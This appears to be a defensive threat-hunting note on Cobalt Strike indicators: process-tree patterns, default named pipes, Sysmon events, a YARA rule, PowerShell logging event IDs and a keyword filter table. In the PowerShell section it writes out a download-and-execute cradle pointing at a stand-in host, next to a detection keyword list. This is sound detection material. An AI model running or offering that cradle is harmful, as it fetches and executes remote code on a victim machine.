# Cobalt Strike IoCs

1. https://www.youtube.com/watch?v=borfuQGrB8g

> **NOTE:** Cobalt Strike's strength is found within it's flexibility, durability, and elasticity. Essentially, it's able to string together many exploits in a robust and customizable C2 framework better than most other frameworks out there...

## Process Tree Detection

> From memory extraction...

<img src="./files/Process_Tree_Detection.png">

### IoCs
1. Prescence of `WmiPrvSE.exe` spawning multiple `powershell.exe` processes/sacrifical processes.
2. Multiple `rundll32.exe` processes generated (default **sacrifical process** for Cobalt Strike; can be changed but still noisy!) 


## Cobalt Strike PowerShell and WMI Processes

> Here we are drilling down on the `rundll32.exe` process of interest...

<img src="./files/PowerShell_and_WMI_Processes.png">

### IoCs
1. Naked command line with **no additional parameters specified** (default setting).
> That being said, the setting can be changed via the malleable C2 Setting
> 
> **HOWEVER** even with a change in the default settings, having multiple command lines with no parameters specified looks **very odd**!

## SysWOW64 Activity

> Here we are looking for the execution of 32-bit code (SysWOW64) associated with with the multiple sacrifical processes of `powershell.exe`

<img src="./files/SysWOW64_Activity.png">

### IoCs
1. Multiple instances of running **`SysWOW64`**, which indicates the prescence of 32-bit code linked with Cobalt Strike! 

## Named Pipe Detection (from Memory)

> Most common and **default** named pipes used by Cobalt Strike

| Pipe Name | Description |
| --- | --- |
| `\\.\pipe\MSSE-####-server` | Default Artifact Kit (AV bypass) |
| `\\<target>\pipe\msagent_##` | Beacon P2L (SMB) Communication |
| `\\.\pipe\status_##` | Stager for Lateral Movement (psexec\_psh Module) |
| `\\.\pipe\postex_ssh_####` | Communication Pipe for SSH Sessions |
| `\\.\pipe\########` (7-10 char) | Post-Exploitation Jobs (mimikatz, powerpick, pth, etc.) |
| `\\.\pipe\postex_####` | Post-Exploitation Jobs v4.2+ |

> '#' = randomly generated hex-value

<img src="./files/Named_Pipes_Memory.png">

> Here is an example of changing the output of Named Pipe names so that it is more difficult to detect, **HOWEVER**, even with an alternate named pipe name seeing an internal workstation connecting to another internal workstation via named pipe is still odd...

### IoCs
1. Each of the named pipes **must** all be changed from defaults, otherwise they can be identified. Attackers often don't modify the defaults because they are still able to go undetected!

## Named Pipe Detection (with Sysmon)

<img src="./files/Named_Pipe_Sysmon.png">

### IoCs
1. Enable **Named Pipe** creation events within Sysmon
2. Look for Events **17** and **18** indicating named creation
3. Pay attention to **PipeName** for default or unique names associated with Cobalt Strike
4. Pay attention to **Image** to look for **SysWOW64** (unique to Cobalt Strike for 32-bit code) and oddly named executables (e.g., `perfmonsvc64.exe`) that seem out of place

## Idenfication of Named Pipes at Scale (with Sysmon)

> Here we are filtering for Event Codes 17 and 18 (named pipe creation), pay special attention to **PipeName** and **Executable (Image Binary)** columns.

<img src="./files/Named_Pipes_at_Scale.png">

### IoCs
1.  Within **Executable (Image Binary)** column we see **`32-bit PowerShell`** being ran multiple insances of **`rundll32.exe`**
2. Within **PipeName** column we seemingly **random Pipe Names**
    > **NOTE:** the length of the "random" named pipes are associated with the commands executed (e.g., mimikatz = **8 characters**, named piped = **8 characters**) 

```bash

# Sample YARA rule to detect randomized Named Pipes in an environment

rule cs_job_pipe
{
    meta:
        description = "Detects CobaltStrike Post Exploitation Named Pipes"
        author = "Riccardo Ancarani & Jon Cave"
        date = "2020-10-04"
    strings:
        $pipe = /\\\\\.\\pipe\\[0-9a-f]{7,10}/ ascii wide fullword
        $guidPipe = /\\\\\.\\pipe\\[0-9a-f]{8}\-/ ascii wide
    condition:
        $pipe and not ($guidPipe)
}
```

* Additional [Malleable Profiles](https://gist.github.com/MHaggis/6c600e524045a6d49c35291a21e10752) that can used for additional IoCs to hunt for!

> **NOTE:** one set of attackers will always use the **default** profiles, whereas another set of attackers will look to **modify the defaults**

* [Detection Name Pipe Creation](https://labs.withsecure.com/publications/detecting-cobalt-strike-default-modules-via-named-pipe-analysis)

## Identifying Cobalt Strike via PowerShell

**Enable PS Script Block Logging**

> PS Script Block Logging enabled via Administrative Template (Group Policy) will log:
> * Cmdlets, functions, full scripts
> * Any use of PS > shell, ISE, or custom implementations

* PSv5 records entire script **ONLY** the first it's ran...

Once properly enabled, pay attention to the following EIDs:
* **EID 4103**: Module logging and pipeline output
* **EID 4104**: Script Block logging

Recommendations:
* Module, Script Block, and Transcription logs
* Increase default log sizes
* Centralize your logs
* Create filters to search for indicators

### IoCs

> Output of the **`powershell-import`** utility within Cobalt Strike...

<img src="./files/powershell-import.png">

1. **`IEX`** download cradle typically used by machines to download things from the internet. Here we see it's reaching out to itself via **`127.0.0.1`**, **very odd**!
2. The prefix **`-exec bypass -EncodedCommand`** is very common for commands ran via Cobalt Strike.
3. **`FromBase64String`** another common encoding for an imported PowerShell script.

**References**
* https://www.crowdstrike.com/en-us/blog/getting-the-bacon-from-cobalt-strike-beacon/

## Scaling Detection in PowerShell Logs

* Events may capture different parts of an attack
* **4103** records module/pipeline output
* **4104** records code (scripts) executed (look for “Warning” events)
* The PowerShell download cradle is heavily used by Cobalt Strike:
**`IEX (New-Object Net.Webclient).downloadstring("http://bad.com/bad.ps1")`**

**Filter using commonly abused keywords**

| | | | |
| --- | --- | --- | --- |
| DownloadString | EncodedCommand | FromBase64String | rundll32 |
| IEX | Invoke-Expression | WebClient | syswow64 |
| powershell -version | http://127.0.0.1 | Reflection | $DoIt |
| Start-Process | Invoke-WMIMethod | Invoke-Command | |

* Look for obvious signs of encoding and obfuscation